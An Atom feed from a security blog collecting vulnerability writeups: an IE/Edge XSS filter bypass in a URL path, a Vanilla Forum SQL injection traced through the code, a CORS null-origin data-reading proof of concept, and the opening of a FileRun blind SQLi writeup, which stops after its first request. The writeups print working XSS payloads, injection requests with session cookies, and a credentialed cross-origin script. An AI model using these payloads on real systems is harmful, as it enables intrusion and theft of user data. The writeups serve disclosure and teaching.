<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-01T02:36:48+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Symbo1</title><entry><title type="html">bug bounty writeup - xss in url path</title><link href="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html" rel="alternate" type="text/html" title="bug bounty writeup - xss in url path" /><published>2018-10-08T00:00:00+08:00</published><updated>2018-10-08T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/10/08/xss-in-url-path</id><content type="html" xml:base="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html">&lt;h1 align=&quot;center&quot;&gt;bug bounty writeup - xss in url path&lt;/h1&gt;
&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;08 Oct 2018 - L3m0n&lt;/p&gt;

&lt;p&gt;漏洞点: http://lemon.i/test/xss/13.php/i_am_xss_point/i_am_xss_point/&lt;/p&gt;

&lt;p&gt;Demo Code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
header('HTTP/1.1 404 Not Found');
$path = trim($_SERVER['PATH_INFO'],&quot;/&quot;);
$limit_pos = strrpos(trim($path,&quot;/&quot;),'/');
$action_name = substr($path, $limit_pos);
$controller_name = str_replace(&quot;/&quot;,&quot;\\&quot;,substr($path, 0, $limit_pos));
echo &quot;Action: &quot; . $action_name . &quot; has controller: \\&quot; . $controller_name;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;404头的问题&quot;&gt;404头的问题&lt;/h2&gt;

&lt;p&gt;如果404响应返回内容小于512字节，则使用IE自带的404页面&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgmq53r6j216y0leq7a.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以添加多个字符即可显示出来内容&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgmuvz2hj21ny0f2wpl.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2、url path问题 -&amp;gt; urlencode编码&lt;/p&gt;

&lt;p&gt;浏览器下访问直接访问都会进行url编码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgqon7f6j217u08cwku.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是在IE下，使用3xx跳转后可以绕过&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
header(&quot;Location: &quot;http://&quot;.$_GET[&quot;host&quot;].&quot;/&quot;.urldecode($_GET[&quot;payload&quot;]),true,302);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=&amp;lt;&amp;gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是可以看到ie filter限制了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgn2pu2uj21o008oqat.jpg&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;bypass-ie-filter&quot;&gt;bypass IE filter&lt;/h2&gt;

&lt;p&gt;IE edge / 11下这样利用&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe onload=&quot;contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=&amp;lt;script&amp;gt;alert(location)&amp;lt;/script&amp;gt;'&quot; src=&quot;//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以换到目标，则payload为如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe src=&quot;http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;iframe&amp;gt;&quot; onload=&quot;contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;img src=1 onerror=alert(1)&amp;gt;'&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是又被一些坑点限制了:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;无空格(会被url-&amp;gt;%20)
无/(会被转换为\)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;bypass限制&quot;&gt;bypass限制&lt;/h2&gt;
&lt;p&gt;通过下面的payload可绕过&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;b&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最终payload:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe src=&quot;http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;iframe&amp;gt;&quot; onload=&quot;contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;b&amp;gt;'&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;referer&quot;&gt;Referer&lt;/h2&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://hackerone.com/reports/311467&quot;&gt;Reflected XSS in the IE 11 / Edge&lt;/a&gt;&lt;br /&gt;
&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet&quot;&gt;Browser’s XSS Filter Bypass Cheat Sheet&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">bug bounty writeup - xss in url path 08 Oct 2018 - L3m0n</summary></entry><entry><title type="html">Vanilla SQL Injection Vulnerability</title><link href="http://localhost:4000/articles/2018/10/02/vanilla-sql-injection.html" rel="alternate" type="text/html" title="Vanilla SQL Injection Vulnerability" /><published>2018-10-02T00:00:00+08:00</published><updated>2018-10-02T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/10/02/vanilla-sql-injection</id><content type="html" xml:base="http://localhost:4000/articles/2018/10/02/vanilla-sql-injection.html">&lt;h1 align=&quot;center&quot;&gt;Vanilla SQL Injection Vulnerability&lt;/h1&gt;
&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;02 Oct 2018 - Balis0ng&lt;/p&gt;

&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;

&lt;p&gt;   Vanilla是国外的一个论坛程序，是一款开源的PHP程序。github地址为:https://github.com/vanilla/vanilla 在Vanilla Forum 2.6之前，存在一个SQL注入漏洞，攻击者只需要注册登录一个会员即可利用该漏洞。&lt;/p&gt;

&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;

&lt;p&gt;首先在applications/dashboard/controllers/class.profilecontroller.php:274&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function deleteInvitation($invitationID) {
        $this-&amp;gt;permission('Garden.SignIn.Allow');

        if (!$this-&amp;gt;Form-&amp;gt;authenticatedPostBack()) {
            throw forbiddenException('GET');
        }

        $invitationModel = new InvitationModel();
        $invitationModel-&amp;gt;delete($invitationID);
        $this-&amp;gt;informMessage(t('The invitation was removed successfully.'));
        $this-&amp;gt;jsonTarget(&quot;.js-invitation[data-id=\&quot;{$invitationID}\&quot;]&quot;, '', 'SlideUp');

        $this-&amp;gt;render('Blank', 'Utility');
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个函数有个形参$invitationID，这个值其实是我们通过URL传递进来的，是我们可控的，并且这里需要注意的是，该值是可以为一个数组。&lt;/p&gt;

&lt;p&gt;首先该函数第一行判断了权限，需要登录。&lt;/p&gt;

&lt;p&gt;第二行是一个csrf token的判断，利用这个漏洞不能直接发POST包。&lt;/p&gt;

&lt;p&gt;然后下面就到了关键的地方，可以看到这里将$invitationID带入到了delete函数中，我们跟踪一下该函数。&lt;/p&gt;

&lt;p&gt;applications/dashboard/models/class.invitationmodel.php:225&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function delete($where = [], $options = []) {
    if (is_numeric($where)) {
        deprecated('InvitationModel-&amp;gt;delete(int)', 'InvitationModel-&amp;gt;deleteID(int)');
        $result = $this-&amp;gt;deleteID($where, $options);
        return $result;
    }
    parent::delete($where, $options);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;   这里的参数$where就是我们上文的$invitationID，是可控的，然后这里又将$where带入到了另外一个delete函数中，继续追踪。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function delete($where = [], $options = []) {
    if (is_numeric($where)) {
        deprecated('Gdn_Model-&amp;gt;delete(int)', 'Gdn_Model-&amp;gt;deleteID()');
        $where = [$this-&amp;gt;PrimaryKey =&amp;gt; $where];
    }

    $resetData = false;
    if ($options === true || val('reset', $options)) {
        deprecated('Gdn_Model-&amp;gt;delete() with reset true');
        $resetData = true;
    } elseif (is_numeric($options)) {
        deprecated('The $limit parameter is deprecated in Gdn_Model-&amp;gt;delete(). Use the limit option.');
        $limit = $options;
    } else {
        $options += ['rest' =&amp;gt; true, 'limit' =&amp;gt; null];
        $limit = $options['limit'];
    }

    if ($resetData) {
        $result = $this-&amp;gt;SQL-&amp;gt;delete($this-&amp;gt;Name, $where, $limit);
    } else {
        $result = $this-&amp;gt;SQL-&amp;gt;noReset()-&amp;gt;delete($this-&amp;gt;Name, $where, $limit);
    }
    return $result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后该函数中又将$where带入到了$this-&amp;gt;SQL-&amp;gt;noReset()-&amp;gt;delete函数中，继续追踪。&lt;/p&gt;

&lt;p&gt;library/database/class.sqldriver.php:333&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function delete($table = '', $where = '', $limit = false) {
	if ($table == '') {
	    if (!isset($this-&amp;gt;_Froms[0])) {
	        return false;
	    }

	    $table = $this-&amp;gt;_Froms[0];
	} elseif (is_array($table)) {
	    foreach ($table as $t) {
	        $this-&amp;gt;delete($t, $where, $limit, false);
	    }
	    return;
	} else {
	    $table = $this-&amp;gt;escapeIdentifier($this-&amp;gt;Database-&amp;gt;DatabasePrefix.$table);
	}

	if ($where != '') {
	    $this-&amp;gt;where($where);
	}

	if ($limit !== false) {
	    $this-&amp;gt;limit($limit);
	}

	if (count($this-&amp;gt;_Wheres) == 0) {
	    return false;
	}

	$sql = $this-&amp;gt;getDelete($table, $this-&amp;gt;_Wheres, $this-&amp;gt;_Limit);

	return $this-&amp;gt;query($sql, 'delete');
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;   该函数中对我们传递进来的$where有个判断和操作，如果不为空，就带入到where函数中去，跟踪一下该函数。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
    if (!is_array($field)) {
        $field = [$field =&amp;gt; $value];
    }

    foreach ($field as $subField =&amp;gt; $subValue) {
        if (is_array($subValue)) {
            if (count($subValue) == 1) {
                $firstVal = reset($subValue);
                $this-&amp;gt;where($subField, $firstVal);
            } else {
                $this-&amp;gt;whereIn($subField, $subValue);
            }
        } else {
            $whereExpr = $this-&amp;gt;conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);
            if (strlen($whereExpr) &amp;gt; 0) {
                $this-&amp;gt;_where($whereExpr);
            }
        }
    }
    return $this;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;   这里其实就是一个组装where语句的函数，由于$where我们可控制，导致这里组装后的where语句的字段处也可以控制，所以就产生了一个SQL注入漏洞。&lt;/p&gt;

&lt;h2 id=&quot;漏洞证明&quot;&gt;漏洞证明&lt;/h2&gt;

&lt;p&gt;   该漏洞利用需要用户登陆，因为是论坛，所以注册登录不是什么难事。
开头提了一下，由于有CSRF TOKEN的校验，所以不能直接发POST包，但是我们可以随便点击论坛一个正常的POST请求，然后用Burpsuite来改即可。
这里我使用的是延时注入，用的是benchmark函数。不同环境的延时时间也不一样的。
附上POC:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/1.1
Host: localhost
Content-Length: 29
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://localhost
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://localhost/profile/
Accept-Language: zh-CN,zh;q=0.9
Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjkyMDE2NTAsImlhdCI6MTUyNjYwOTY1MCwic3ViIjo3fQ.of1gk2CHyzeomQNSMWz_8WXXi_FfCwKxyctVWZlemKI; Vanilla-Vv=1526609650; Vanilla-tk=caEyM0dSVZC0xDhU%3A7%3A1526609650%3Ab23a6efff2dd9f026ffa87db10ba4119
Connection: close

TransientKey=caEyM0dSVZC0xDhU
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后这里延时了9秒。如图所示:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/11/30/5c01538e4cdf6.jpg&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;结语&quot;&gt;结语&lt;/h2&gt;

&lt;p&gt;   其实这种漏洞很常见，很多程序在处理SQL语句的时候，都采用的这种写法，当然这种写法是没错的。主要还是因为开发人员太信任外部的输入了。&lt;/p&gt;

&lt;p&gt;该程序在该版本相同类型的漏洞还有一个，大家有兴趣的话可以自己找一找。(当然我已经提交给厂商啦。)&lt;/p&gt;</content><author><name></name></author><summary type="html">Vanilla SQL Injection Vulnerability 02 Oct 2018 - Balis0ng</summary></entry><entry><title type="html">Abusing CORS via null origin</title><link href="http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin.html" rel="alternate" type="text/html" title="Abusing CORS via null origin" /><published>2018-07-04T00:00:00+08:00</published><updated>2018-07-04T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin</id><content type="html" xml:base="http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin.html">&lt;h1 align=&quot;center&quot;&gt;Abusing CORS via null origin&lt;/h1&gt;
&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;04 Jul 2018 - onehackzero&lt;/p&gt;

&lt;h2 id=&quot;poc&quot;&gt;POC:&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
    var url = &quot;https://www.victim.com/api/getuser&quot;;
    var req = new XMLHttpRequest();
    req.open('get',url,true);
    req.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;);
    req.withCredentials = true;
    req.send();
    req.onreadystatechange= function(){
    if(req.readyState == req.DONE) {
        document.write(this.responseText)
    }}
 &amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This code was converted to the equivalent Base64 string.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe width=100% height=100% src=&quot;data:text/html;base64,PHNjcmlwdD4gdmFyIHVybCA9ICJodHRwczovL3d3dy52aWN0aW0uY29tL2FwaS9nZXR1c2VyIjsgIHZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtyZXEub3BlbignZ2V0Jyx1cmwsdHJ1ZSk7cmVxLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsICJhcHBsaWNhdGlvbi9qc29uIik7cmVxLndpdGhDcmVkZW50aWFscyA9IHRydWU7cmVxLnNlbmQoKTtyZXEub25yZWFkeXN0YXRlY2hhbmdlPSBmdW5jdGlvbigpe2lmKHJlcS5yZWFkeVN0YXRlID09IHJlcS5ET05FKSB7ZG9jdW1lbnQud3JpdGUodGhpcy5yZXNwb25zZVRleHQpfSB9PC9zY3JpcHQ+&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;further-reading&quot;&gt;Further reading:&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties&quot; target=&quot;_blank&quot;&gt;Exploiting CORS misconfigurations for Bitcoins and bounties&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/&quot; target=&quot;_blank&quot;&gt;Exploiting Misconfigured CORS (Cross Origin Resource Sharing)&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains&quot; target=&quot;_blank&quot;&gt;Exploiting Misconfigured CORS via Wildcard Subdomains&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html&quot; target=&quot;_blank&quot;&gt;CORS misconfigurations on a large scale&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://yassineaboukir.com/blog/cors-exploitation-data-exfiltration-when-allowed-origin-is-set-to-null/&quot; target=&quot;_blank&quot;&gt;CORS Exploitation: Data exfiltration when allowed origin is set to NULL&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/&quot; target=&quot;_blank&quot;&gt;CORS Misconfigurations Explained&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.sxcurity.pro/advanced-cors-techniques/&quot; target=&quot;_blank&quot;&gt;Advanced CORS Exploitation Techniques&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Abusing CORS via null origin 04 Jul 2018 - onehackzero</summary></entry><entry><title type="html">FileRun &amp;lt;= 2017.09.25 Blind SQLi</title><link href="http://localhost:4000/articles/2017/12/18/filerun-blind-sqli.html" rel="alternate" type="text/html" title="FileRun &lt;= 2017.09.25 Blind SQLi" /><published>2017-12-18T00:00:00+08:00</published><updated>2017-12-18T00:00:00+08:00</updated><id>http://localhost:4000/articles/2017/12/18/filerun-blind-sqli</id><content type="html" xml:base="http://localhost:4000/articles/2017/12/18/filerun-blind-sqli.html">&lt;h1 align=&quot;center&quot;&gt;FileRun &amp;lt;= 2017.09.25 Blind SQLi&lt;/h1&gt;
&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;18 Dec 2017 - scanf&lt;/p&gt;

&lt;h2 id=&quot;0x00-preface&quot;&gt;0x00 Preface&lt;/h2&gt;

&lt;p&gt;   在内部分享中需要用到私有的云盘服务,一番寻找之后发现FileRun是个不错的应用程序.FileRun允许我们自己搭建云存储，方便我们的照片，视频等文件更好的分享和存储.
   Sometimes team private file sharing need use file sharing web application.I noticed FileRun is a great application,This application allows us to access our files anywhere through self-hosted secure cloud storage.&lt;/p&gt;

&lt;h2 id=&quot;0x01-how-to-find-the-vulnerability&quot;&gt;0x01 How To Find The Vulnerability&lt;/h2&gt;

&lt;p&gt;   需要我们以&lt;code class=&quot;highlighter-rouge&quot;&gt;superuser&lt;/code&gt;登录后台&lt;/p&gt;

&lt;p&gt;These vulnerabilitys was found after the authentication. After we logged in as &lt;code class=&quot;highlighter-rouge&quot;&gt;superuser&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;sql1&quot;&gt;SQL1&lt;/h3&gt;

&lt;p&gt;控制面板——&amp;gt;Admin——&amp;gt;用户——&amp;gt;快速搜索,这样将会发送一个POST请求。&lt;/p&gt;

&lt;p&gt;go to control panel——&amp;gt;Admin——&amp;gt;user——&amp;gt;search,will generate a POST request to the server.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?module=users&amp;amp;section=cpanel&amp;amp;page=list HTTP/1.1
Host: target.com
Content-Length: 20
Origin: http://target.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: http://target.com/?module=cpanel&amp;amp;_popup_id=popups_1
Accept-Language: zh-CN,zh;q=0.9
Cookie: __cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; FileRunSID=e578cd49697ef564ed0979bde9d67dcf
Connection: close

limit=50&amp;amp;search=aaaa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我注意到search参数容易受到SQL注入的影响,通过传入aaaa’ 服务器返回了一个500的响应状态:&lt;/p&gt;

